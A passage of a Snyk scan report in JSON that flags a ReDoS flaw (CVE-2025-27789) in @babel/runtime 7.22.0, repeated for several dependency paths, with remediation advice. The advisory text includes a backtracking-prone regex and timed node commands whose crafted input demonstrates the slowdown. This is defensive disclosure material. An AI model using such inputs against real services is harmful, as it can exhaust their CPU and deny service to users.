            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/material@5.13.2",
          "@mui/system@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@mui/system@5.18.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@emotion/react@11.11.0",
          "@emotion/babel-plugin@11.11.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/react@11.11.0",
          "@emotion/babel-plugin@11.13.5",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@emotion/styled@11.11.0",
          "@emotion/babel-plugin@11.11.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/styled@11.11.0",
          "@emotion/babel-plugin@11.13.5",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/material@5.13.2",
          "@mui/base@5.0.0-beta.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.16.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
